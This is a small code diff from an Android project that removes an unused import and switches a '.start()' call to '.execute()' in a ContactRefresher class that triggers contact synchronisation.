@@ -10,7 +10,6 @@ import com.theah64.xrob.database.Contacts;
 import com.theah64.xrob.database.PhoneNumbers;
 import com.theah64.xrob.models.Contact;
 import com.theah64.xrob.utils.APIRequestGateway;
-import com.theah64.xrob.utils.ContactUtils;
 import com.theah64.xrob.utils.PrefUtils;
 
 /**
@@ -171,7 +170,7 @@ public class ContactRefresher extends AsyncTask<Void, Void, Boolean> {
                     new ContactsSynchronizer(context).execute(apiKey);
                 }
 
-            }).start();
+            }).execute();
         }
 
     }
